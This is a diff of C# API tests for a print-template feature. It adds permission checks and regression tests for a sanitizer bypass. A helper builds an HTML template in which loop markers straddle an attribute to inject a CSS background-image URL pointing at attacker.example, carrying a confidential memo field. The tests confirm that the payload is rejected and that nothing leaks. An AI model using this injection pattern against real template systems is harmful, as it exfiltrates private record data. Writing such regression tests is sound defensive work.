@@ -266,6 +266,16 @@ public class PrintApiTests : IDisposable
     }
 
     [Fact]
+    public async Task Print_WithReadRevokedButPrintExportKept_Forbidden_AndOptionsToo()
+    {
+        var w = await MakeWorld();
+        await Create(_admin, w.Parent, "quote", FullBody(w));
+        await SetSalesPermissions(w, printExport: true, read: false);
+        (await Print(_sales, w.RecordId, "quote")).StatusCode.Should().Be(HttpStatusCode.Forbidden);
+        (await _sales.GetAsync($"{Base}/modules/{w.Parent}/print-templates")).StatusCode.Should().Be(HttpStatusCode.Forbidden);
+    }
+
+    [Fact]
     public async Task Print_OwnScope_CannotPrintSomeoneElsesRecord()
     {
         var w = await MakeWorld(); // admin 建立
@@ -378,14 +388,67 @@ public class PrintApiTests : IDisposable
         (await PrintOk(_admin, w)).Should().Contain("<p>{{_printedAt}}</p>");
     }
 
+    // ---- 迴圈展開繞過消毒（fix-1 #1）----
+
+    private static string LoopAcrossAttribute(string memoKey, string loopKey = "d") =>
+        "<a title=\"{{#each " + loopKey + "}}\">x</a><p>{{/each}}\" style=\"background-image:url(https://attacker.example/?v={{" + memoKey +
+        "}})\"><b>X</b></p>";
+
+    [Fact]
+    public async Task Xss_LoopMarkersInsideAttributes_RejectedOnSave()
+    {
+        var w = await MakeWorld();
+        var res = await Create(_admin, w.Parent, "quote", LoopAcrossAttribute(w.Memo, w.Child));
+        res.StatusCode.Should().Be(HttpStatusCode.BadRequest, await res.Content.ReadAsStringAsync());
+        (await JsonOf(await _admin.GetAsync($"{Base}/modules/{w.Parent}/print-templates/definitions"))).GetArrayLength().Should().Be(0);
+    }
+
+    [Fact]
+    public async Task Xss_LoopSpanningAnAttribute_StoredBeforeTheFix_PrintsNoExternalUrl()
+    {
+        var w = await MakeWorld(memo: "機密備註");
+        await Create(_admin, w.Parent, "quote", "<p>ok</p>");
+        // 直接寫進資料庫（模擬舊資料），迴圈對應的明細模組不存在 → 明細為空，展開後會把前後兩段拼起來
+        Db(db => db.Set<PrintTemplate>().Single().Body = LoopAcrossAttribute(w.Memo));
+        await AssertRefusedWithoutLeak(w);
+    }
+
+    [Fact]
+    public async Task Xss_LoopSpanningAnAttribute_WithRows_PrintsNoExternalUrl()
+    {
+        var w = await MakeWorld(memo: "機密備註");
+        await Create(_admin, w.Parent, "quote", "<p>ok</p>");
+        Db(db => db.Set<PrintTemplate>().Single().Body = LoopAcrossAttribute(w.Memo, w.Child));
+        await AssertRefusedWithoutLeak(w);
+    }
+
+    /// <summary>範本標記跨過標籤：列印直接拒絕（400），輸出裡沒有外部網址、樣式或欄位值。</summary>
+    private async Task AssertRefusedWithoutLeak(World w)
+    {
+        var res = await Print(_admin, w.RecordId, "quote");
+        var text = (await res.Content.ReadAsStringAsync()).ToLowerInvariant();
+        res.StatusCode.Should().Be(HttpStatusCode.BadRequest, text);
+        text.Should().NotContain("attacker.example").And.NotContain("background-image").And.NotContain("機密備註");
+    }
+
+    [Fact]
+    public async Task Print_DocumentCarriesAContentSecurityPolicyMeta()
+    {
+        var w = await MakeWorld();
+        await Create(_admin, w.Parent, "quote", "<p>x</p>");
+        var html = await PrintOk(_admin, w);
+        html.Should().Contain("http-equiv=\"Content-Security-Policy\"").And.Contain("default-src 'none'");
+        html.Should().Contain("style-src 'unsafe-inline'").And.Contain("img-src data:");
+    }
+
     // ---- helpers ----
 
     private async Task SetSalesPermissions(
-        World w, bool printExport, bool pricing = true, string scope = "all", long[]? hidden = null)
+        World w, bool printExport, bool pricing = true, string scope = "all", long[]? hidden = null, bool read = true)
     {
         var groups = await JsonOf(await _admin.GetAsync($"{Base}/groups"));
         var salesId = groups.EnumerateArray().Single(g => g.GetProperty("key").GetString() == "sales").GetProperty("id").GetInt64();
-        var priv = new { read = true, add = true, edit = true, delete = true, printExport, pricing, approve = false };
+        var priv = new { read, add = true, edit = true, delete = true, printExport, pricing, approve = false };
         // 明細模組的權限沿用表頭，只設表頭
         var put = await _admin.PutAsJsonAsync($"{Base}/modules/{w.Parent}/permissions", new
         {
